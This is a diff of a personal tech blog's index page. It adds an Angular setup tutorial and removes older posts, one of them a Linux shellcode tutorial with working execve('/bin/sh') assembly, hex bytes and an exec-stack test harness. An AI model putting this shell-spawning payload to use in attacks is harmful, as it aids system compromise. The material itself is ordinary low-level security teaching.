@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="The main programming languages covered are: Python、Typescript、Go、C&#x2F;C++、asm、Bash">
+  <meta name="description" content="Python、Typescript、Go、C&#x2F;C++、asm、Bash">
 <meta property="og:type" content="website">
 <meta property="og:title" content="congdong007">
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="congdong007">
-<meta property="og:description" content="The main programming languages covered are: Python、Typescript、Go、C&#x2F;C++、asm、Bash">
+<meta property="og:description" content="Python、Typescript、Go、C&#x2F;C++、asm、Bash">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="Dong Cong">
 <meta property="article:tag" content="Python、Typescript、Go、C&#x2F;C++、asm、Bash、Penetration Tester">
@@ -99,7 +99,7 @@
       <h1 class="site-title">congdong007</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">A technology-focused organization</p>
+      <p class="site-subtitle" itemprop="description">Penetration Test、Software Developer</p>
   </div>
 
   <div class="site-nav-right">
@@ -158,12 +158,112 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/18/angular-start/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/06/18/angular-start/" class="post-title-link" itemprop="url">Angular from Beginner to Hero (1) -- Setting up the Local Environment and Workspace</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-06-18 21:07:20" itemprop="dateCreated datePublished" datetime="2022-06-18T21:07:20-04:00">2022-06-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 17:46:37" itemprop="dateModified" datetime="2023-10-18T17:46:37-04:00">2023-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Angular-from-Beginner-to-Hero/" itemprop="url" rel="index"><span itemprop="name">Angular from Beginner to Hero</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace/" itemprop="url" rel="index"><span itemprop="name">(1) Setting up the Local Environment and Workspace</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h1><p>  To use the Angular framework, you should be familiar with the following:<br>   – JavaScript<br>   – HTML<br>   – CSS<br>  Knowledge of TypeScript is helpful, but not required.</p>
+<p>  To install Angular on your local system, you need the following:</p>
+<ol>
+<li>Node.js:<br>Angular requires an active LTS or maintenance LTS version of Node.js.<br>Here’s the newest version in nodejs.org&#x2F;en:<br><img src="/images/nodejs.jpg"><br>If you are unsure what version of Node.js runs on your system, run node -v in a terminal window.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">v16.17.1</span><br></pre></td></tr></table></figure></li>
+<li>npm Package Manager:<br>Angular, the Angular CLI, and Angular applications depend on npm packages for many features and functions. To download and install npm packages, you need an npm package manager. This guide uses the npm client command line interface, which is installed with Node.js by default. To check that you have the npm client installed, run npm -v in a terminal window.</li>
+</ol>
+<h1 id="Install-the-Angular-CLI"><a href="#Install-the-Angular-CLI" class="headerlink" title="Install the Angular CLI"></a>Install the Angular CLI</h1><p>  To install the Angular CLI, open a terminal window and run the following command:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @angular/cli</span><br></pre></td></tr></table></figure></p>
+<h1 id="Create-a-workspace-and-initial-application"><a href="#Create-a-workspace-and-initial-application" class="headerlink" title="Create a workspace and initial application"></a>Create a workspace and initial application</h1><p>  You develop apps in the context of an Angular workspace.</p>
+<p>  To create a new workspace and initial starter app:<br>    1. Run the CLI command ng new and provide the name my-app, as shown here:<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng new my-app</span><br></pre></td></tr></table></figure><br>    2. The ng new command prompts you for information about features to include in the initial app. Accept the defaults by pressing the Enter or Return key.</p>
+<p>  The Angular CLI installs the necessary Angular npm packages and other dependencies. This can take a few minutes.</p>
+<p>  The CLI creates a new workspace and a simple Welcome app, ready to run.</p>
+<h1 id="Run-the-application"><a href="#Run-the-application" class="headerlink" title="Run the application"></a>Run the application</h1><p>  The Angular CLI includes a server, for you to build and serve your app locally.</p>
+<ol>
+<li>Navigate to the workspace folder, such as my-app.</li>
+<li>Run the following command:  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> my-app</span><br><span class="line">ng serve --open</span><br></pre></td></tr></table></figure>
+  The ng serve command launches the server, watches your files, and rebuilds the app as you make changes to those files.<br>  The –open (or just -o) option automatically opens your browser to <a target="_blank" rel="noopener" href="http://localhost:4200/">http://localhost:4200/</a>.</li>
+</ol>
+<p>  If your installation and setup was successful, you should see a page similar to the following.</p>
+<p>  <img src="/images/app-works.png"> </p>
+<h1 id="Compile-and-Package"><a href="#Compile-and-Package" class="headerlink" title="Compile and Package"></a>Compile and Package</h1><p>  Angular CLI also provides commands:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng build --prod</span><br></pre></td></tr></table></figure><br>  Among them, the parameter –prod tells the compilation environment to compile for the production environment package.</p>
+<p>  Similarly, in the ‘angular.json’ file, default compilation parameters are defined, and if necessary, they can be modified. The main configuration parameters are as follows.<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;configurations&quot;</span>: &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="string">&quot;budgets&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;initial&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumWarning&quot;</span>: <span class="string">&quot;5mb&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumError&quot;</span>: <span class="string">&quot;10mb&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;anyComponentStyle&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumWarning&quot;</span>: <span class="string">&quot;1mb&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumError&quot;</span>: <span class="string">&quot;4mb&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">       ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>  Angular, by default, compiles to the ‘dist’ directory under the root directory, generating pure static files (html, css, js), as well as image files.</p>
+<h1 id="Deploy-to-a-Server"><a href="#Deploy-to-a-Server" class="headerlink" title="Deploy to a Server"></a>Deploy to a Server</h1><p>  Here, I am using the “phpStudy” tool, and I am going into its root directory, which is “c:\phpStudy\PHPTutorial\WWW”,copy all file from ‘dist’ directory to “c:\phpStudy\PHPTutorial\WWW” directory, restart phpStudy’s services,  then open chrome browser, the website can be opened(<a target="_blank" rel="noopener" href="http://localhost/index.html">http://localhost/index.html</a>).</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2019/02/12/goAboutUnitTest/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -254,7 +354,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -347,7 +447,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -432,7 +532,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -525,7 +625,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -618,7 +718,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -711,12 +811,12 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2011/10/22/SimplePluginSystemByPython/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/24/UnionSqlInjection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -725,7 +825,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2011/10/22/SimplePluginSystemByPython/" class="post-title-link" itemprop="url">A Simple Plugin System by Python</a>
+            <a href="/2016/10/24/UnionSqlInjection/" class="post-title-link" itemprop="url">Union Sql Injection Detection Methods</a>
         </h2>
 
         <div class="post-meta">
@@ -735,102 +835,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2011-10-22 16:41:33" itemprop="dateCreated datePublished" datetime="2011-10-22T16:41:33-04:00">2011-10-22</time>
+              <time title="Created: 2016-10-24 19:11:44" itemprop="dateCreated datePublished" datetime="2016-10-24T19:11:44-04:00">2016-10-24</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-17 12:05:47" itemprop="dateModified" datetime="2023-10-17T12:05:47-04:00">2023-10-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/System-Architecture/" itemprop="url" rel="index"><span itemprop="name">System Architecture</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/System-Architecture/Plugin-Pattern/" itemprop="url" rel="index"><span itemprop="name">Plugin Pattern</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Due to the requirements of my work, I needed to design an open software system, and immediately thought of the Python language. As a result, I designed a simple and easily extensible plugin system.</p>
-<p>Here’s the code:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#main.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line">class PluginManager:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.plugins = []</span><br><span class="line">        self.func_name = <span class="string">&quot;MyPlugin&quot;</span></span><br><span class="line"></span><br><span class="line">    def load_plugin(self, plugin_name):</span><br><span class="line">        try:</span><br><span class="line">            plugin_module = importlib.import_module(f<span class="string">&#x27;plugins.&#123;plugin_name&#125;&#x27;</span>)</span><br><span class="line">            plugin_instance = getattr(plugin_module, self.func_name)()</span><br><span class="line">            self.plugins.append(plugin_instance)</span><br><span class="line">            <span class="built_in">print</span>(f<span class="string">&quot;plugin &#123;plugin_name&#125; loaded.&quot;</span>)</span><br><span class="line">        except ImportError:</span><br><span class="line">            <span class="built_in">print</span>(f<span class="string">&quot;Load plugin &#123;plugin_name&#125; failed.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    def run_plugins(self):</span><br><span class="line">        <span class="keyword">for</span> plugin <span class="keyword">in</span> self.plugins:</span><br><span class="line">            plugin.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    manager = PluginManager()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1. Add Plugin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;2. Run Plugin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;3. Quit&quot;</span>)</span><br><span class="line">        choice = input(<span class="string">&quot;Your Select: &quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">            plugin_name = input(<span class="string">&quot;Please input the name of plugin: &quot;</span>)</span><br><span class="line">            manager.load_plugin(plugin_name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">            manager.run_plugins()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>Then, you create a directory named ‘plugins.’ In this directory, you can add your plugin, which must define a class named <strong><em>‘MyPlugin’</em></strong> and must have a function named <strong><em>‘run’</em></strong>. Here is the simple code:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#my_plugin</span></span><br><span class="line"></span><br><span class="line">class MyPlugin:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">    def run(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;MyPlugin is running&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>The following is the running process:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1. Add Plugin</span><br><span class="line">2. Run Plugin</span><br><span class="line">3. Quit</span><br><span class="line">Your Select: 1</span><br><span class="line">Please input the name of plugin: my_plugin</span><br><span class="line">plugin my_plugin loaded.</span><br><span class="line">1. Add Plugin</span><br><span class="line">2. Run Plugin</span><br><span class="line">3. Quit</span><br><span class="line">Your Select: 2</span><br><span class="line">MyPlugin is running</span><br><span class="line">1. Add Plugin</span><br><span class="line">2. Run Plugin</span><br><span class="line">3. Quit</span><br><span class="line">Your Select: 3</span><br><span class="line">PS C:\Users\xxx\Desktop\yyy\plugin-system&gt;</span><br></pre></td></tr></table></figure>
-
-<p>You can use this model to design a big and an opened software system.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2011/10/16/shellcodewrite/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2011/10/16/shellcodewrite/" class="post-title-link" itemprop="url">Shellcode Written in Linux</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2011-10-16 11:54:47" itemprop="dateCreated datePublished" datetime="2011-10-16T11:54:47-04:00">2011-10-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-17 12:05:08" itemprop="dateModified" datetime="2023-10-17T12:05:08-04:00">2023-10-17</time>
+                <time title="Modified: 2023-10-18 19:46:14" itemprop="dateModified" datetime="2023-10-18T19:46:14-04:00">2023-10-18</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -842,103 +854,15 @@
                 </span>
                   , 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/shellcode/" itemprop="url" rel="index"><span itemprop="name">shellcode</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Before you start learning shellcode development, please install NASM on your Linux system. Here’s the shellcode code:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">jmp short callShellcode</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line"></span><br><span class="line">pop esi                     ; Pop <span class="string">&#x27;/bin/sh&#x27;</span> from the stack into esi</span><br><span class="line">xor eax, eax                ; Set eax to NULL</span><br><span class="line">mov byte [esi + 7], al      ; Null-terminate <span class="string">&#x27;/bin/sh&#x27;</span> using the low byte of eax</span><br><span class="line">lea ebx, [esi]              ; Load the address of <span class="string">&#x27;/bin/sh&#x27;</span> into ebx</span><br><span class="line">mov dword [esi + 8], ebx</span><br><span class="line">lea ecx, [esi + 8]          ; Load the address of the argv array into ecx</span><br><span class="line">mov dword [esi + 12], eax</span><br><span class="line">lea edx, [esi + 12]         ; Load the address of the NULL terminator into edx</span><br><span class="line">mov al, 0x0b               ; Set al to 0x0b, the system call number <span class="keyword">for</span> execve</span><br><span class="line">int 0x80                   ; Trigger the syscall</span><br><span class="line"></span><br><span class="line">callShellcode:</span><br><span class="line"></span><br><span class="line">call shellcode</span><br><span class="line">db <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>After saving this code to a file named “shellx.asm,” you need to compile it using NASM to obtain the hexadecimal representation of the code. Use the following commands:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf shellx.asm</span><br><span class="line">ld -o shellx shellx.o -m elf_i386</span><br></pre></td></tr></table></figure>
-
-<p>This will generate a “shellx” file. However, it’s not executable yet. You’ll need to use the “objdump” command to extract the hexadecimal code. You can use a Bash script like this:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(objdump -d <span class="string">&quot;<span class="variable">$1</span>&quot;</span> | <span class="built_in">tr</span> <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | egrep <span class="string">&#x27;^[0-9a-f]&#123;2&#125;$&#x27;</span>); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;\x<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>To validate your assembly code, you’ll need a C program as follows:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">char code[] = <span class="string">&quot;\xeb\x18\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x8d\x4e\x08\x89\x46\x0c\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span>;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    int (*func)();</span><br><span class="line">    func = (int (*)()) code;</span><br><span class="line">    (int)(*func)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Compile this code with the following command:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o shellcodetest shellcodetest.c -m32 -z execstack</span><br></pre></td></tr></table></figure>
-
-<p>This will produce an executable, “shellcodetest.” When you run it, you’ll get a shell with root privileges:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/shellCode_train<span class="comment"># ./shellcodetest</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">    exit.asm     hello     shellcodetest    shellx.asm</span><br><span class="line">    exit.o       hello.asm  shellcodetest.c  shellx.o</span><br><span class="line">    getshellcode.sh  hello.o    shellx</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">    root</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2011/03/02/nasmCompile/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="The main programming languages covered are: Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2011/03/02/nasmCompile/" class="post-title-link" itemprop="url">How to compile asm to execute under Linux</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2011-03-02 11:31:25" itemprop="dateCreated datePublished" datetime="2011-03-02T11:31:25-05:00">2011-03-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-17 11:39:39" itemprop="dateModified" datetime="2023-10-17T11:39:39-04:00">2023-10-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Asm/" itemprop="url" rel="index"><span itemprop="name">Asm</span></a>
